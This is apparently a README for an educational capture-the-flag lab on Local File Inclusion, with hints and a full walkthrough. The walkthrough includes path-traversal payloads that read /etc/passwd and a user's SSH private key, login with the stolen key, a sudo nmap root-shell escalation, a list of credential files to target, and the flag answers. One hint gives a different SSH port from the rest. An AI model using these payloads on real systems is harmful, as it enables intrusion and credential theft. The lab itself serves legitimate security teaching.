# FinTech Systems - LFI CTF Challenge

## Overview

FinTech Systems is a CTF challenge focused on **Local File Inclusion (LFI)** vulnerability. The challenge simulates a professional cybersecurity company website with a vulnerable documentation viewer.

**Objective:** Find and exploit the LFI vulnerability to read the flag from the system.

## Challenge Information

- **Difficulty:** Beginner/Intermediate
- **Category:** Web Exploitation
- **Vulnerability Type:** Local File Inclusion (LFI)
- **Ports:**
  - **3080** - Web Application
  - **3022** - SSH Service
- **Flag Format:** `FinTech{...}`
- **Number of Flags:** 3 (LFI + SSH + Privilege Escalation)

## Setup Instructions

### Prerequisites
- Docker
- Docker Compose

### Running the Challenge

1. Build and start the container:
```bash
cd ctf-lfi
docker-compose up -d --build
```

2. Access the application:
```
http://localhost:3080
```

3. Stop the challenge:
```bash
docker-compose down
```

## Challenge Details

The website features:
- **Authentication system** (required for all pages except home/login/register)
- User dashboard with quick access
- Services showcase
- Team profiles
- **Documentation viewer** (vulnerable LFI endpoint)
- File upload (decoy - not vulnerable)

### Key Features

- **Modern Design:** Green-teal glassmorphism theme with sidebar navigation
- **Interactive UI:** Smooth animations and hover effects
- **Decoy Pages:** Multiple pages to make reconnaissance more realistic
- **Realistic Context:** Professional cybersecurity company theme

## Hints

### Basic LFI Challenge

<details>
<summary>Hint 1 (Click to reveal)</summary>
Explore the documentation section of the website.
</details>

<details>
<summary>Hint 2 (Click to reveal)</summary>
The /documentation/view endpoint accepts a file parameter.
</details>

<details>
<summary>Hint 3 (Click to reveal)</summary>
Try reading system files like /etc/passwd first.
</details>

<details>
<summary>Hint 4 (Click to reveal)</summary>
Look for hints in /etc/passwd about where the flag might be located.
</details>

<details>
<summary>Hint 5 (Click to reveal)</summary>
The first flag is located at /etc/flag
</details>

### Advanced SSH Challenge

<details>
<summary>Hint 6 (Click to reveal)</summary>
Check the hint in /etc/passwd about SSH keys and user home directories.
</details>

<details>
<summary>Hint 7 (Click to reveal)</summary>
SSH private keys are typically stored in ~/.ssh/id_rsa for each user.
</details>

<details>
<summary>Hint 8 (Click to reveal)</summary>
Try reading /home/ctfuser/.ssh/id_rsa using the LFI vulnerability.
</details>

<details>
<summary>Hint 9 (Click to reveal)</summary>
Save the private key, set permissions to 600, and use it to SSH into the server on port 2222.
</details>

<details>
<summary>Hint 10 (Click to reveal)</summary>
After SSH login, check your home directory for another flag file.
</details>

## Solution Walkthrough

<details>
<summary>Full Solution (SPOILER ALERT)</summary>

### Step 1: Register an Account
- Navigate to `http://localhost:3080/register`
- Create an account with username and password (minimum 6 characters)
- Example: username: `ctfplayer`, password: `password123`
- After registration, you'll be redirected to your dashboard

### Step 2: Access Dashboard
- After login/register, you'll be on your dashboard at `http://localhost:3080/dashboard`
- The dashboard provides quick access to documentation and other resources

### Step 3: Access Documentation
- From the dashboard, click on "View Documentation" or navigate to `http://localhost:3080/docs`

### Step 4: Test the Documentation Viewer
- Notice the documentation viewer allows you to view files
- Try the provided examples like `/app/docs/readme.txt`
- Observe the URL structure: `/documentation/view?file=<path>`

### Step 5: Exploit LFI Vulnerability
The documentation viewer doesn't sanitize the file path, allowing you to read any file on the system.

**Test payload (Absolute path):**
```
http://localhost:3080/documentation/view?file=/etc/passwd
```

**Alternative payload (Path traversal):**
```
http://localhost:3080/documentation/view?file=../../../../../../../../../etc/passwd
```

Both methods should display the contents of /etc/passwd.

### Step 6: Find the Flag Hint
In the /etc/passwd file, you'll see a comment at the bottom:
```
# HINT: Check /etc/flag for something interesting
```

### Step 7: Capture the Flag
Read the flag file:
```
http://localhost:3080/documentation/view?file=/etc/flag
```

**Flag 1:** `FinTech{f1l3_r34d1ng_thr0ugh_lf1_3xpl01t}`

### Step 8: Advanced Challenge - SSH Private Key Exposure

Now that you've mastered the basic LFI, let's escalate privileges by reading the SSH private key.

**Read the SSH private key (Absolute path):**
```
http://localhost:3080/documentation/view?file=/home/ctfuser/.ssh/id_rsa
```

**Alternative (Path traversal):**
```
http://localhost:3080/documentation/view?file=../../../../../../home/ctfuser/.ssh/id_rsa
```

This will reveal the private SSH key. Save it to a file (e.g., `id_rsa_stolen`).

### Step 9: Connect via SSH

**Prepare the key:**
```bash
# Save the key to a file
cat > id_rsa_stolen << 'EOF'
[paste the private key content here]
EOF

# Set correct permissions
chmod 600 id_rsa_stolen
```

**Connect via SSH:**
```bash
ssh -i id_rsa_stolen -p 3022 ctfuser@localhost
```

### Step 10: Capture Second Flag

Once connected, read the second flag:
```bash
cat ~/flag_ssh.txt
```

**Flag 2:** `FinTech{pr1v4t3_k3y_st0l3n_v14_lf1_vuln}`

### Step 11: Privilege Escalation (GTFOBins)

Once logged in via SSH, enumerate for privilege escalation vectors:

**Enumerate sudoers configuration:**
```bash
# Check sudoers.d directory
ls -la /etc/sudoers.d/

# Read sudoers file for current user
cat /etc/sudoers.d/ctfuser

# Alternative: Search for sudoers files
find /etc -readable -name "sudoers*" -o -readable -name "*sudoers.d*" 2>/dev/null
```

You'll discover:
```
ctfuser ALL=(ALL) NOPASSWD: /usr/bin/nmap
```

**Exploit using GTFOBins:**
```bash
# Method 1: Get root shell using nmap interactive mode
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

# Method 2: Read root flag directly using nmap
sudo nmap -iR 0 --script=<(echo 'local f=io.open("/root/flag_root.txt","r"); print(f:read("*all")); f:close()')

# Method 3: Interactive nmap shell (older versions)
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
```

### Step 12: Capture Root Flag

After gaining root access:
```bash
cat /root/flag_root.txt
```

**Flag 3:** `FinTech{nm4p_r00t_3sc4l4t10n_succ3ss}`

</details>

## Learning Objectives

After completing this challenge, you should understand:

1. **Local File Inclusion (LFI):**
   - How LFI vulnerabilities occur
   - The impact of unrestricted file access
   - Common system files to target
   - How to escalate LFI to system compromise

2. **SSH Key Exposure:**
   - How exposed SSH private keys lead to unauthorized access
   - The importance of protecting private keys
   - How to use stolen SSH keys for authentication
   - Real-world privilege escalation scenarios

3. **Privilege Escalation:**
   - Using GTFOBins to identify exploitable binaries
   - How misconfigured sudo permissions lead to root access
   - The importance of principle of least privilege
   - Enumerating sudo permissions with `sudo -l`

4. **Reconnaissance:**
   - Using robots.txt for discovery
   - Testing input parameters
   - Reading system configuration files
   - Identifying user home directories

5. **Defense:**
   - Never trust user input for file paths
   - Use allowlists for permitted files
   - Implement proper path sanitization
   - Use chroot or containerization
   - Apply principle of least privilege
   - Protect SSH private keys with proper permissions
   - Disable password authentication when using keys
   - Audit sudo permissions regularly
   - Avoid giving NOPASSWD sudo access to dangerous binaries

## Decoy Features

The challenge includes decoy elements to make it more realistic:

1. **File Upload Page** - Appears functional but doesn't process files
2. **API Search** - Returns fake results
3. **Multiple Pages** - About, Services, Team sections

## Security Recommendations

To prevent LFI vulnerabilities:

1. **Never use user input directly in file operations**
2. **Use allowlists** for permitted files
3. **Validate and sanitize** all file paths
4. **Use IDs instead of filenames** in URLs
5. **Implement proper access controls**
6. **Disable directory listing**

### Secure Code Example:

```python
# INSECURE (Current implementation)
file_path = request.args.get('file')
with open(file_path, 'r') as f:
    content = f.read()

# SECURE (Recommended)
ALLOWED_FILES = {
    'readme': '/app/docs/readme.txt',
    'api-guide': '/app/docs/api-guide.txt',
    'policy': '/app/docs/security-policy.txt'
}

file_id = request.args.get('file')
if file_id not in ALLOWED_FILES:
    abort(403)

file_path = ALLOWED_FILES[file_id]
with open(file_path, 'r') as f:
    content = f.read()
```

## Design Features

- **Color Scheme:** Green-teal-cyan cybersecurity theme
- **Layout:** Sidebar navigation (different from OS injection challenge)
- **Effects:** Glassmorphism, parallax, smooth animations
- **UX:** Modern, professional, and interactive

## Common LFI Payloads

For learning purposes, here are common LFI targets:

```
/etc/passwd                    - User accounts
/etc/shadow                    - Password hashes (usually restricted)
/etc/hosts                     - Host mappings
/etc/hostname                  - System hostname
/proc/self/environ             - Environment variables
/var/log/apache2/access.log    - Web server logs
/home/[user]/.ssh/id_rsa       - SSH private keys
/home/[user]/.ssh/authorized_keys - SSH authorized keys
/root/.ssh/id_rsa              - Root SSH private key (if accessible)
```

## SSH Access Information

After exploiting the LFI vulnerability to obtain the SSH private key:

- **SSH Port:** 3022
- **Username:** ctfuser
- **Authentication:** Public key only (password auth disabled)
- **Private Key Location:** `/home/ctfuser/.ssh/id_rsa` (readable via LFI)
- **Second Flag Location:** `/home/ctfuser/flag_ssh.txt`

## Credits

**Created for:** Educational CTF competitions
**Challenge Type:** Web Security - Local File Inclusion
**Difficulty:** Beginner/Intermediate
**Version:** 1.0

## License

This challenge is provided for educational purposes only. Use in authorized testing environments only.
